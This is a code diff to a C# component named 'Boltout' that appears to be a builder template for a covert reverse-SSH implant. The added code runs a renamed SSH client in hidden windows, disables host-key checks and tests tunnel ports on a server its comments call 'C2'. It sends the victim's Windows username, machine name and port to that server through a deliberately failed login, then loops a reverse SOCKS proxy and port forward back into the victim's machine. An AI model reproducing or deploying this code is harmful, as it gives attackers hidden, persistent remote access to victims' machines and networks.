@@ -70,6 +70,8 @@ public class Boltout
     {
         string sshHost = "REPLACE_SSH_HOST";
         List<int> ports = new List<int> { REPLACE_PORT_ARRAY };
+        int[] tunnelPorts = new int[] { REPLACE_TUNNEL_PORT_ARRAY };
+        int boltdLocalPort = REPLACE_BOLTD_LOCAL_PORT;
         int selectedPort = -1;
 
         foreach (int p in ports)
@@ -104,20 +106,60 @@ public class Boltout
             string boltCon = Path.Combine(baseDirectory, "REPLACE_FILES_DIR", "REPLACE_BOLTCON_EXE");
             string boltKey = Path.Combine(baseDirectory, "REPLACE_FILES_DIR", "REPLACE_KEYFILE_NAME");
 
-            // Identity probe: one failed auth logs Windows user+machine to C2 auth log
-            string probeUser = SanitizeUsername(Environment.UserName + "." + Environment.MachineName);
-            Process probe = new Process();
-            probe.StartInfo.FileName = boltCon;
-            probe.StartInfo.Arguments = $"-o StrictHostKeyChecking=no -o ConnectTimeout=5 -o loglevel=ERROR -p {selectedPort} -i {boltKey} {probeUser}@{sshHost} -N";
-            probe.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
-            probe.Start();
-            if (!probe.WaitForExit(8000)) probe.Kill();
-
             while (true)
             {
+                // Select tunnel port: try each in range; keep the first that survives 5 s
+                // (ExitOnForwardFailure causes boltcon to exit immediately if the port is taken on C2)
+                int selectedTunnelPort = -1;
+                foreach (int tPort in tunnelPorts)
+                {
+                    Process testConn = new Process();
+                    testConn.StartInfo.FileName = boltCon;
+                    testConn.StartInfo.Arguments =
+                        $"-o StrictHostKeyChecking=no -o ExitOnForwardFailure=yes " +
+                        $"-o ConnectTimeout=10 -o loglevel=ERROR " +
+                        $"-p {selectedPort} -i {boltKey} {userName}@{sshHost} " +
+                        $"-R {tPort}:127.0.0.1:{boltdLocalPort} -N";
+                    testConn.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                    testConn.Start();
+                    Thread.Sleep(5000);
+                    if (!testConn.HasExited)
+                    {
+                        selectedTunnelPort = tPort;
+                        testConn.Kill();
+                        testConn.WaitForExit();
+                        break;
+                    }
+                }
+
+                if (selectedTunnelPort == -1)
+                {
+                    Thread.Sleep(REPLACE_RECONNECT_DELAY_MS);
+                    continue;
+                }
+
+                // Identity probe: one failed-auth connection logs Windows user + machine + port
+                // Auth log shows: Invalid user john.LAPTOP-ABC123.p31335 from 1.2.3.4 port 54321
+                string probeUser = SanitizeUsername(
+                    Environment.UserName + "." + Environment.MachineName + ".p" + selectedTunnelPort);
+                Process probe = new Process();
+                probe.StartInfo.FileName = boltCon;
+                probe.StartInfo.Arguments =
+                    $"-o StrictHostKeyChecking=no -o ConnectTimeout=5 -o loglevel=ERROR " +
+                    $"-p {selectedPort} -i {boltKey} {probeUser}@{sshHost} -N";
+                probe.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                probe.Start();
+                if (!probe.WaitForExit(8000)) probe.Kill();
+
+                // Real tunnel connection
                 Process boltConStart = new Process();
                 boltConStart.StartInfo.FileName = boltCon;
-                boltConStart.StartInfo.Arguments = $"-o StrictHostKeyChecking=no -o ServerAliveInterval=30 -o Compression=yes -o ForwardAgent=no -o TCPKeepAlive=yes -o ServerAliveCountMax=5 -o loglevel=ERROR -p {selectedPort} -i {boltKey} {userName}@{sshHost} -R REPLACE_SOCKS_PORT -R REPLACE_TUNNEL_PORT:127.0.0.1:REPLACE_TUNNEL_PORT -N";
+                boltConStart.StartInfo.Arguments =
+                    $"-o StrictHostKeyChecking=no -o ServerAliveInterval=30 -o Compression=yes " +
+                    $"-o ForwardAgent=no -o TCPKeepAlive=yes -o ServerAliveCountMax=5 " +
+                    $"-o ExitOnForwardFailure=yes -o loglevel=ERROR " +
+                    $"-p {selectedPort} -i {boltKey} {userName}@{sshHost} " +
+                    $"-R REPLACE_SOCKS_PORT -R {selectedTunnelPort}:127.0.0.1:{boltdLocalPort} -N";
                 boltConStart.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                 boltConStart.Start();
                 boltConStart.WaitForExit();
